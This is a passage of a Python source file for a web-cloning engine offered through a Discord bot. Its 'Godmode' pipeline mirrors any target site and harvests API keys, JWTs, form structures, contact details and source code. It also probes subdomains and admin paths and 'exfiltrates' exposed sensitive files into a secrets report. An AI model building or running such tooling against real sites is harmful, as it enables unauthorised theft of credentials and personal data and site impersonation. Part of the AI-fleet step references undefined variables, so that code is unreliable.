        (bot_dir / ".env.example").write_text("DISCORD_BOT_TOKEN=YOUR_BOT_TOKEN_HERE\nCOMMAND_PREFIX=!\n", encoding="utf-8")
        (bot_dir / ".env").write_text("DISCORD_BOT_TOKEN=\nCOMMAND_PREFIX=!\n", encoding="utf-8")
        (bot_dir / "requirements.txt").write_text("discord.py>=2.3.0\npython-dotenv>=1.0.0\naiohttp>=3.9.0\n", encoding="utf-8")
        (bot_dir / "README.md").write_text(f"# Turnkey Discord Bot for {domain}\n\n1. Run `pip install -r requirements.txt`\n2. Put your token in `.env`\n3. Run `python main.py`\n", encoding="utf-8")

    def _create_cyber_audit_html(self, session_folder: Path, domain: str, target_url: str, downloaded_count: int, tech_stack: TechStackReport):
        audit_html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PAYOMBØYZ CYBER RECON REPORT | {domain}</title>
    <style>
        body {{ background: #0b0f19; color: #f1f5f9; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, monospace; margin: 0; padding: 24px; }}
        .header {{ border-bottom: 2px solid #00e696; padding-bottom: 16px; margin-bottom: 24px; display: flex; justify-content: space-between; align-items: center; }}
        h1 {{ color: #00e696; margin: 0; font-size: 24px; letter-spacing: 1px; }}
        .badge {{ background: #00e696; color: #000; padding: 4px 10px; border-radius: 4px; font-weight: bold; font-size: 13px; }}
        .grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 16px; margin-bottom: 24px; }}
        .card {{ background: #131d31; border: 1px solid #1e293b; border-radius: 8px; padding: 18px; }}
        .card h3 {{ margin-top: 0; color: #38bdf8; font-size: 16px; }}
        .stat {{ font-size: 28px; font-weight: bold; color: #f8fafc; margin: 8px 0; }}
        ul {{ padding-left: 20px; margin: 0; }}
        li {{ margin-bottom: 6px; word-break: break-all; font-size: 13px; color: #cbd5e1; }}
        .warning {{ color: #fb7185; font-weight: bold; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🌐 PAYOMBØYZ CYBER RECONNAISSANCE AUDIT</h1>
        <span class="badge">STACK: {tech_stack.backend_framework.upper()}</span>
    </div>

    <div class="grid">
        <div class="card">
            <h3>🎯 Target Domain</h3>
            <div class="stat">{domain}</div>
            <p style="color:#94a3b8;font-size:12px;margin:0;">URL: {target_url}</p>
        </div>
        <div class="card">
            <h3>⚙️ Detected Tech Stack</h3>
            <div class="stat" style="font-size:20px;color:#38bdf8;">{tech_stack.backend_framework}</div>
            <p style="color:#94a3b8;font-size:12px;margin:0;">Frontend: {tech_stack.frontend_framework}</p>
        </div>
        <div class="card">
            <h3>📦 Localized Assets</h3>
            <div class="stat">{downloaded_count:,} Files</div>
            <p style="color:#94a3b8;font-size:12px;margin:0;">SPA Hydration: {'✅ Chrome Pre-rendered' if self.is_spa_hydrated else '⚡ Fast TLS'}</p>
        </div>
        <div class="card">
            <h3>🔬 Reconstructed Sources</h3>
            <div class="stat">{self.harvested_source_files} Files</div>
            <p style="color:#94a3b8;font-size:12px;margin:0;">TypeScript/JSX from Source Maps</p>
        </div>
    </div>

    <div class="grid">
        <div class="card">
            <h3>⚙️ Discovered API Endpoints ({len(self.discovered_apis)})</h3>
            <ul>
                {"".join(f"<li><code>{api}</code></li>" for api in sorted(list(self.discovered_apis))[:15]) or "<li>None discovered</li>"}
            </ul>
        </div>
        <div class="card">
            <h3>🛡️ Perimeter Exfiltrations ({len(self.security_findings)})</h3>
            <ul>
                {"".join(f"<li class='warning'>[HTTP {sf['status']}] {sf['path']} ({sf['size']} bytes)</li>" for sf in self.security_findings) or "<li>Clean / No exposed files</li>"}
            </ul>
        </div>
    </div>
</body>
</html>
"""
        (session_folder / "CYBER_AUDIT.html").write_text(audit_html, encoding="utf-8")

    def clone_website(self, target_url: str, custom_cookies: Optional[str] = None) -> Dict[str, Any]:
        start_time = time.time()
        parsed = urllib.parse.urlparse(target_url)
        if not parsed.scheme:
            target_url = "https://" + target_url
            parsed = urllib.parse.urlparse(target_url)

        domain = parsed.netloc or "cloned_site"
        safe_domain = re.sub(r'[^a-zA-Z0-9_\-]', '_', domain)
        timestamp = int(time.time())

        session_folder = CLONE_OUTPUT_DIR / f"{safe_domain}_{timestamp}"
        session_folder.mkdir(parents=True, exist_ok=True)

        # Create Semantic Asset Folders
        html_dir = session_folder / "html"
        css_dir = session_folder / "css"
        js_dir = session_folder / "js"
        images_dir = session_folder / "images"
        fonts_dir = session_folder / "fonts"
        phantom_dir = session_folder / "phantom"

        for d in (html_dir, css_dir, js_dir, images_dir, fonts_dir, phantom_dir):
            d.mkdir(parents=True, exist_ok=True)

        req_headers = {}
        if custom_cookies:
            req_headers["Cookie"] = custom_cookies

        print(f"[*] Starting Web Clone Engine [Mode: {self.mode}] for {target_url}")

        # Step 1: Fetch raw HTML
        raw_bytes, content_type, status, resp_headers = self._fetch(target_url, headers=req_headers)
        raw_html = raw_bytes.decode("utf-8", errors="replace") if raw_bytes else ""
        self.raw_server_headers = resp_headers

        headers_txt = "\n".join(f"{k}: {v}" for k, v in resp_headers.items())
        (session_folder / "server_headers.txt").write_text(headers_txt, encoding="utf-8")
        self._gather_network_ip_info(domain, session_folder)

        # Step 1.5: SPA Route Harvester & Multi-Page Crawling
        self.discovered_routes = SPARouteHarvester.harvest_all_routes(target_url, raw_html, self._fetch)
        print(f"[+] SPARouteHarvester discovered {len(self.discovered_routes)} internal SPA routes: {sorted(list(self.discovered_routes))[:10]}")

        pages_html_map: Dict[str, str] = {}
        if self.mode in ("Godmode", "ปีศาจกลืนกินโลก", "Deep", "Full"):
            print("[*] Running Deep Multi-Page Hydration & Computed Style Aggregation...")
            pages_html_map = self._crawl_multi_page_routes(
                target_url=target_url,
                routes=self.discovered_routes,
                session_folder=session_folder,
                custom_cookies=custom_cookies
            )

        hydrated_html = pages_html_map.get("/", None)
        if hydrated_html:
            print(f"[+] Successfully captured Post-Hydration Root DOM ({len(hydrated_html):,} bytes)")

        html_text = hydrated_html or raw_html
        if not html_text:
            return {"success": False, "error": f"Failed to connect to target: {content_type}", "status": status}

        self.downloaded_urls.add(target_url)

        # Step 2: Next.js & Form Recon
        self._extract_nextjs_data(html_text, session_folder)
        self._scan_secrets_and_apis(html_text, target_url)
        if raw_html:
            self._scan_secrets_and_apis(raw_html, target_url)
        for r_path, r_content in pages_html_map.items():
            self._scan_secrets_and_apis(r_content, urllib.parse.urljoin(target_url, r_path))

        if self.mode in ("Full", "Cookie Pass", "Phantom", "Godmode", "ปีศาจกลืนกินโลก"):
            self._extract_forms(html_text)

        # Step 3: Extract & Download Core Assets Across ALL Hydrated Pages
        combined_assets = self._extract_assets(html_text, target_url)
        if raw_html:
            for a in self._extract_assets(raw_html, target_url):
                if a not in combined_assets:
                    combined_assets.append(a)
        for r_path, r_content in pages_html_map.items():
            for a in self._extract_assets(r_content, urllib.parse.urljoin(target_url, r_path)):
                if a not in combined_assets:
                    combined_assets.append(a)
        assets = combined_assets

        downloaded_count = 1
        asset_url_map = {}
        lock = threading.Lock()

        def _download_asset_worker(item: Tuple[int, str]):
            nonlocal downloaded_count
            idx, a_url = item
            with lock:
                if a_url in self.downloaded_urls:
                    return
                self.downloaded_urls.add(a_url)

            a_data, a_type, a_stat, _ = self._fetch(a_url, headers=req_headers, timeout=8)
            if not a_data:
                return

            parsed_a = urllib.parse.urlparse(a_url)
            fname = os.path.basename(parsed_a.path)
            clean_type = a_type.lower()

            if ".css" in fname or "css" in clean_type:
                sub_dir = css_dir
                rel_prefix = "css"
                def_ext = ".css"
            elif any(x in fname for x in (".js", ".mjs")) or "javascript" in clean_type:
                sub_dir = js_dir
                rel_prefix = "js"
                def_ext = ".js"
            elif any(x in fname for x in (".woff2", ".woff", ".ttf", ".otf", ".eot")) or "font" in clean_type:
                sub_dir = fonts_dir
                rel_prefix = "fonts"
                def_ext = ".woff2"
            else:
                sub_dir = images_dir
                rel_prefix = "images"
                def_ext = ".png"

            if not fname or "." not in fname:
                fname = f"asset_{idx}{def_ext}"

            safe_fname = re.sub(r'[^a-zA-Z0-9_\-\.]', '_', fname)
            local_path = sub_dir / safe_fname
            local_path.write_bytes(a_data)

            rel_save_path = f"{rel_prefix}/{safe_fname}"
            with lock:
                asset_url_map[a_url] = rel_save_path
                self.url_asset_mapping[a_url] = rel_save_path
                downloaded_count += 1

            # Deep Scan JS Bundles
            if rel_prefix == "js":
                js_text = a_data.decode("utf-8", errors="replace")
                with lock:
                    self.js_snippets_collected.append(js_text[:5000])
                    self._scan_secrets_and_apis(js_text, a_url)
                if self.mode in ("Godmode", "ปีศาจกลืนกินโลก", "Deep", "Full"):
                    self._harvest_source_maps(a_url, js_text, session_folder)

            # Deep Scan CSS for fonts & background images
            if rel_prefix == "css":
                css_text = a_data.decode("utf-8", errors="replace")
                sub_urls = re.findall(r'url\(["\']?([^)"\']+)["\']?\)', css_text, re.IGNORECASE)
                for su in sub_urls[:25]:
                    if not su.startswith("data:"):
                        full_su = urllib.parse.urljoin(a_url, su)
                        su_data, _, _, _ = self._fetch(full_su, headers=req_headers, timeout=5)
                        if su_data:
                            su_fname = "font_" + re.sub(r'[^a-zA-Z0-9_\-\.]', '_', os.path.basename(full_su) or "res.bin")
                            (fonts_dir / su_fname).write_bytes(su_data)
                            css_text = css_text.replace(su, f"../fonts/{su_fname}")
                local_path.write_text(css_text, encoding="utf-8", errors="replace")

        asset_work_items = list(enumerate(assets[:200], start=1))
        with concurrent.futures.ThreadPoolExecutor(max_workers=16) as pool:
            list(pool.map(_download_asset_worker, asset_work_items))

        # Step 4: Intelligent Tech Stack Fingerprinting
        tech_stack = TechStackAnalyzer.analyze(
            target_url=target_url,
            resp_headers=resp_headers,
            cookies_header=custom_cookies or "",
            raw_html=raw_html,
            js_snippets=self.js_snippets_collected,
            fetch_fn=self._fetch
        )
        print(f"[+] Detected Tech Stack: {tech_stack.backend_framework} (Confidence: {tech_stack.confidence:.0%})")

        # Step 5: Extract Detailed API Contracts
        api_contracts = ApiContractExtractor.extract_contracts(
            apis=self.discovered_apis,
            html_text=html_text,
            js_snippets=self.js_snippets_collected
        )
        print(f"[+] Reconstructed {len(api_contracts)} strongly-typed API Contracts")

        # Step 6: Generate Universal Browser API Client & Interceptor
        api_client_code = (
            "// PAYOMBØYZ Auto-Extracted API Client & Offline Mock Interceptor\n"
            "const API_BASE = 'http://localhost:8080';\n"
            f"const TECH_STACK = {json.dumps(tech_stack.backend_framework)};\n"
            f"const DISCOVERED_ENDPOINTS = {json.dumps([c.path for c in api_contracts], indent=2)};\n\n"
            "async function callApi(endpoint, data = {}, method = 'POST') {\n"
            "    const res = await fetch(API_BASE + endpoint, {\n"
            "        method: method,\n"
            "        headers: { 'Content-Type': 'application/json' },\n"
            "        body: method !== 'GET' ? JSON.stringify(data) : undefined\n"
            "    });\n"
            "    return await res.json();\n"
            "}\n"
        )
        (js_dir / "api.js").write_text(api_client_code, encoding="utf-8")

        # Step 7: Aggregate Master Stylesheet & Multi-Page Offline View Synthesis
        # 7.1 Aggregate All Stylesheets and Runtime <style> into css/master_styles.css
        master_css_parts = [
            "/* ==========================================================================\n"
            f"   PAYOMBØYZ MASTER STYLESHEET AGGREGATION — {domain.upper()}\n"
            f"   Auto-compiled for 100% Offline Visual Fidelity\n"
            "   Includes Static Bundles, Tailwind CSS, Emotion/Styled-Components & CSSOM Rules\n"
            "   ========================================================================== */\n"
        ]

        if css_dir.exists():
            for css_file in sorted(css_dir.glob("*.css")):
                if css_file.name == "master_styles.css":
                    continue
                try:
                    c_content = css_file.read_text(encoding="utf-8", errors="replace")
                    if c_content.strip():
                        master_css_parts.append(f"\n/* --- Static Asset: {css_file.name} --- */\n{c_content}")
                except Exception:
                    pass

        if self.all_runtime_styles:
            master_css_parts.append(
                "\n/* ==========================================================================\n"
                "   DYNAMIC RUNTIME STYLES & POST-HYDRATION CSSOM RULES\n"
                "   ========================================================================== */\n"
            )
            master_css_parts.extend(self.all_runtime_styles)

        master_css_text = "\n\n".join(master_css_parts)
        (css_dir / "master_styles.css").write_text(master_css_text, encoding="utf-8")
        print(f"[+] Aggregated master_styles.css ({len(master_css_text):,} bytes) with {len(self.all_runtime_styles)} runtime style blocks")

        # 7.2 Process and Rewrite HTML for Root and All Discovered Multi-Page Routes
        if "/" not in pages_html_map and html_text:
            pages_html_map["/"] = html_text

        def rewrite_page_assets(raw_page_html: str, is_root: bool = False) -> str:
            page_rewritten = raw_page_html
            for orig_u, local_rel in asset_url_map.items():
                target_rel = local_rel if is_root else f"../{local_rel}"
                page_rewritten = page_rewritten.replace(orig_u, target_rel)
                parsed_u = urllib.parse.urlparse(orig_u)
                if parsed_u.path and len(parsed_u.path) > 3:
                    page_rewritten = page_rewritten.replace(parsed_u.path, target_rel)

            css_href = "css/master_styles.css" if is_root else "../css/master_styles.css"
            js_src = "js/api.js" if is_root else "../js/api.js"
            injected_head = (
                f'\n    <!-- PAYOMBØYZ Master Style & Offline API Injection -->\n'
                f'    <link rel="stylesheet" href="{css_href}">\n'
                f'    <script src="{js_src}"></script>\n'
            )
            if "</head>" in page_rewritten:
                page_rewritten = page_rewritten.replace("</head>", f"{injected_head}</head>", 1)
            elif "<head>" in page_rewritten:
                page_rewritten = page_rewritten.replace("<head>", f"<head>{injected_head}", 1)
            else:
                page_rewritten = injected_head + page_rewritten
            return page_rewritten

        # A. Save root index.html and html/index.html
        root_raw = pages_html_map.get("/", html_text)
        root_processed = rewrite_page_assets(root_raw, is_root=True)
        (session_folder / "index.html").write_text(root_processed, encoding="utf-8")

        root_sub_processed = rewrite_page_assets(root_raw, is_root=False)
        (html_dir / "index.html").write_text(root_sub_processed, encoding="utf-8")

        # B. Save all discovered sub-routes to html/<slug>.html
        route_links_for_catalog = [('Root Home (/)', '../index.html')]
        for r_path, p_html in pages_html_map.items():
            if r_path == "/":
                continue
            slug = re.sub(r'[^a-zA-Z0-9_\-]', '_', r_path.strip('/'))
            if not slug:
                slug = "page"
            sub_processed = rewrite_page_assets(p_html, is_root=False)
            route_file = html_dir / f"{slug}.html"
            route_file.write_text(sub_processed, encoding="utf-8")
            route_links_for_catalog.append((f"{r_path} -> {slug}.html", f"{slug}.html"))

        # C. Generate Routes Catalog Navigation in html/routes_catalog.html
        catalog_items = "\n".join([
            f'        <li style="margin: 8px 0;"><a href="{href}" style="color: #38bdf8; text-decoration: none; font-size: 15px; font-family: monospace;">📁 {title}</a></li>'
            for title, href in route_links_for_catalog
        ])
        catalog_html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Route Catalog — {domain}</title>
    <link rel="stylesheet" href="../css/master_styles.css">
    <style>
        body {{ background: #0f172a; color: #f8fafc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 40px 20px; }}
        .catalog-container {{ max-width: 800px; margin: 0 auto; background: #1e293b; border-radius: 12px; border: 1px solid #334155; padding: 32px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }}
        h1 {{ color: #38bdf8; margin-top: 0; font-size: 24px; border-bottom: 1px solid #334155; padding-bottom: 16px; }}
        ul {{ list-style-type: none; padding-left: 0; }}
        .badge {{ background: #0284c7; color: #fff; padding: 3px 8px; border-radius: 6px; font-size: 12px; font-weight: bold; margin-left: 8px; }}
    </style>
</head>
<body>
    <div class="catalog-container">
        <h1>🌐 Discovered Multi-Page Routes <span class="badge">{len(pages_html_map)} Pages</span></h1>
        <p style="color: #94a3b8; font-size: 14px;">Every internal page rendered and hydrated offline with master CSS styling.</p>
        <ul>
{catalog_items}
        </ul>
    </div>
</body>
</html>'''
        (html_dir / "routes_catalog.html").write_text(catalog_html, encoding="utf-8")

        # Step 8: Subdomain & Admin Probing
        if self.mode in ("Bypass", "Full", "Godmode", "ปีศาจกลืนกินโลก"):
            self._probe_subdomains(domain)
        (session_folder / "subdomains.txt").write_text("\n".join(self.subdomains_alive) or "None detected", encoding="utf-8")

        self._probe_admin_paths(target_url)
        (session_folder / "admin_paths.txt").write_text("\n".join(self.admin_paths_found) or "None found", encoding="utf-8")

        # Step 9: Perimeter Sensitive File Exfiltration
        self._probe_and_exfiltrate_sensitive_files(target_url, session_folder)

        secrets_lines = [f"=== DISCOVERED SECRETS & LEAKED PERIMETER ARTIFACTS ({domain}) ==="]
        for f_line in self.exfiltrated_files:
            secrets_lines.append(f_line)
        for s in self.discovered_secrets:
            secrets_lines.append(f"[{s['type']}] {s['snippet']} (Source: {s['source']})")
        (session_folder / "secrets.txt").write_text("\n".join(secrets_lines), encoding="utf-8")

        # Step 10: Phantom Crawler Maps
        all_urls_txt = "\n".join(sorted(list(self.all_crawled_urls)))
        (phantom_dir / "all_urls.txt").write_text(all_urls_txt or target_url, encoding="utf-8")
        (phantom_dir / "url_map.json").write_text(json.dumps(self.url_asset_mapping, indent=2), encoding="utf-8")

        # Step 11: Synthesize Native Multi-Stack Backend (Java Spring Boot 3, Node Express, or Python FastAPI)
        NativeBackendSynthesizer.synthesize_all(
            session_folder=session_folder,
            domain=domain,
            tech_stack=tech_stack,
            contracts=api_contracts
        )

        # Step 12: Synthesize Architecture Specifications (ARCHITECTURE.md, openapi.yaml, docker-compose.yml)
        ArchitectureSpecGenerator.generate_all(
            session_folder=session_folder,
            domain=domain,
            target_url=target_url,
            tech_stack=tech_stack,
            contracts=api_contracts,
            downloaded_count=downloaded_count,
            harvested_sources=self.harvested_source_files,
            security_findings=self.security_findings,
            discovered_routes=self.discovered_routes
        )

        # Step 13: Generate Turnkey Discord Bot Companion Package
        self._create_turnkey_discord_bot(session_folder, domain)

        # Step 14: Generate Cyber Recon HTML Dashboard
        self._create_cyber_audit_html(session_folder, domain, target_url, downloaded_count, tech_stack)

        # Step 15: Generate Comprehensive Text Reconnaissance Summary
        recon_report_path = session_folder / "SECURITY_RECON_REPORT.txt"
        report_lines = [
            "================================================================================",
            f"🌐 CYBER RECONNAISSANCE & FULL-STACK CLONE REPORT — {domain.upper()}",
            "================================================================================",
            f"Target URL:            {target_url}",
            f"Operational Mode:      {self.mode}",
            f"Detected Tech Stack:   {tech_stack.backend_framework}",
            f"Detected Frontend:     {tech_stack.frontend_framework}",
            f"Build Tool Descriptor: {tech_stack.build_tool}",
            f"Stack Confidence:      {int(tech_stack.confidence * 100)}%",
            f"SPA Hydration:         {'Headless Chrome Pre-rendered' if self.is_spa_hydrated else 'Fast TLS / JA3'}",
            f"Total Files Mirrored:  {downloaded_count:,}",
            f"Reconstructed Sources: {self.harvested_source_files:,} (TypeScript/JSX)",
            f"API Contracts Wired:   {len(api_contracts):,}",
            f"Exfiltrated Files:     {len(self.exfiltrated_files):,}",
            f"Total Secrets Found:   {len(self.discovered_secrets):,}",
            f"Decoded JWT Payloads:  {len(self.decoded_jwts):,}",
            f"Forms Dumped:          {len(self.forms_dumped):,}",
            f"Contacts Harvested:    {len(self.contacts_harvested):,}",
            f"Native Backend Gen:    YES (in backend-{tech_stack.backend_tech}/)",
            f"Turnkey Live Server:   YES (server.py & start.bat in root)",
            f"Architecture Specs:    YES (ARCHITECTURE.md, openapi.yaml, docker-compose.yml)",
            "================================================================================",
            "",
            "--- [1] FORENSIC TECH STACK EVIDENCE ---"
        ]
        for ev in tech_stack.evidence:
            report_lines.append(f"  • {ev}")

        report_lines.append("\n--- [2] DISCOVERED API ENDPOINTS ---")
        for c in api_contracts[:35]:
            report_lines.append(f"  • [{c.method}] {c.path} -> {c.summary} (DTO: {c.request_dto_name})")

        if self.exfiltrated_files:
            report_lines.append("\n--- [3] EXFILTRATED SENSITIVE FILES ---")
            for ef in self.exfiltrated_files[:25]:
                report_lines.append(f"  • {ef}")

        if self.discovered_secrets:
            report_lines.append("\n--- [4] SENSITIVE TOKENS & SECRETS (OWASP A02) ---")
            for sec in self.discovered_secrets[:15]:
                report_lines.append(f"  • [{sec['type']}] {sec['snippet']} (From: {sec['source']})")

        if self.decoded_jwts:
            report_lines.append("\n--- [5] DECODED JWT PAYLOADS ---")
            for jwt in self.decoded_jwts[:5]:
                report_lines.append(f"  • Source: {jwt['source']}")
                report_lines.append(f"    Payload: {json.dumps(jwt['payload'], indent=4)}")

        if self.discovered_routes:
            report_lines.append(f"\n--- [6] DISCOVERED MULTI-PAGE & SPA ROUTES ({len(self.discovered_routes)} Routes) ---")
            for r in sorted(list(self.discovered_routes)):
                slug = "index" if r == "/" else re.sub(r'[^a-zA-Z0-9_\-]', '_', r.strip('/'))
                offline_f = "index.html" if r == "/" else f"html/{slug}.html"
                report_lines.append(f"  • Route: {r:<25} -> {offline_f}")

        report_lines.append("\n================================================================================")
        recon_report_path.write_text("\n".join(report_lines), encoding="utf-8")

        # Step 15.5: 20-AI Autonomous Fleet Deep Reconstruction (Isolated API Pool)
        fleet_report = {}
        try:
            from bot.cloner_ai_fleet import ClonerAIFleet
            endpoints_summary = "\n".join([f"{c.method} {c.path} -> {c.summary}" for c in api_contracts]) or "REST/CRUD API endpoints"
            fleet_report = ClonerAIFleet.execute_fleet_pipeline(
                target_url=target_url,
                site_name=safe_domain,
                raw_html=rendered_html,
                headers=dict(resp_headers),
                js_snippets=self.js_snippets,
                discovered_assets=[a for _, a in assets_to_download],
                found_secrets={"secrets": self.discovered_secrets, "exfiltrated": self.exfiltrated_files},
                endpoints_summary=endpoints_summary,
                output_dir=session_folder
            )
            print(f"[+] 20-AI Autonomous Fleet finished {fleet_report.get('agents_completed', 20)}/20 tasks in {fleet_report.get('fleet_elapsed', 0)}s", flush=True)
        except Exception as fleet_err:
            print(f"[!] Cloner AI Fleet warning: {fleet_err}", flush=True)

        # Step 16: Bundle into Complete Offline Distribution ZIP Package
        zip_path = CLONE_OUTPUT_DIR / f"{safe_domain}_cloned_{timestamp}.zip"
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, _, files in os.walk(session_folder):
                for file in files:
                    full_p = Path(root) / file
                    arcname = full_p.relative_to(session_folder)
                    zf.write(full_p, arcname)

        elapsed = time.time() - start_time
        print(f"[+] Cloned {downloaded_count} assets in {elapsed:.2f}s -> {zip_path}")

        return {
            "success": True,
            "target_url": target_url,
            "domain": domain,
            "mode": self.mode,
            "tech_stack": {
                "backend_tech": tech_stack.backend_tech,
                "backend_framework": tech_stack.backend_framework,
                "frontend_framework": tech_stack.frontend_framework,
                "build_tool": tech_stack.build_tool,
                "evidence": tech_stack.evidence,
                "confidence": tech_stack.confidence
            },
            "downloaded_files": downloaded_count,
            "harvested_source_files": self.harvested_source_files,
            "is_spa_hydrated": self.is_spa_hydrated,
            "discovered_routes": sorted(list(self.discovered_routes)),
            "pages_captured": len(pages_html_map),
            "apis_found": list(self.discovered_apis),
            "api_contracts_count": len(api_contracts),
            "secrets_found": self.discovered_secrets,
            "exfiltrated_files": self.exfiltrated_files,
            "decoded_jwts": self.decoded_jwts,
            "contacts_found": list(self.contacts_harvested),
            "forms_found": self.forms_dumped,
            "security_findings": self.security_findings,
            "subdomains_alive": self.subdomains_alive,
            "admin_paths": self.admin_paths_found,
            "ai_fleet": fleet_report,
            "session_folder": str(session_folder),
            "report_path": str(recon_report_path),
            "architecture_path": str(session_folder / "ARCHITECTURE.md"),
            "openapi_path": str(session_folder / "openapi.yaml"),
            "html_path": str(session_folder / "index.html"),
            "routes_catalog_path": str(session_folder / "html" / "routes_catalog.html"),
            "master_styles_path": str(session_folder / "css" / "master_styles.css"),
            "blueprint_path": str(recon_report_path),
            "zip_path": str(zip_path),
            "zip_size_bytes": zip_path.stat().st_size,
            "elapsed": elapsed
        }


def clone_site(url: str, mode: str = "Godmode", cookies: Optional[str] = None) -> Dict[str, Any]:
    """Public helper function for Discord commands and panels."""
    engine = WebCloneEngine(mode=mode)
    return engine.clone_website(url, custom_cookies=cookies)
